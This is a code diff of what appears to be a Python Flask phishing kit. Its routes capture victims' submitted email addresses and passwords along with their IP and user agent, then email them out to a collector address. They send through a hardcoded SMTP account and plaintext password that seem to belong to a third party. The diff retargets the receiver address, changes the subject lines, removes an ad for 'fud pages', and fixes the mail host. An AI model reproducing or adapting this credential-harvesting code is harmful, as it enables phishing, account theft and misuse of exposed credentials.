@@ -197,20 +197,20 @@ def first():
         password = "Coopacvll2017"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs "
+        message["Subject"] = "Black Clover mars"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
         Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
+        ow are you?
+       
         """
         html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
         part1 = MIMEText(text, "plain")
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("coopacvallelaleche.comm", 465) as server:
+        with smtplib.SMTP_SSL("coopacvallelaleche.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -233,17 +233,16 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "administracion@coopacvallelaleche.com"
         sender_emaill = "administracion"
-        receiver_email = "kokofunds147@gmail.com"
+        receiver_email = "tracey.kender@moonfee.com"
         password = "Coopacvll2017"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs  !! "
+        message["Subject"] = "Black Clover Pluto"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
+        the,
+        dogs are ok?
         """
         html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
         part1 = MIMEText(text, "plain")
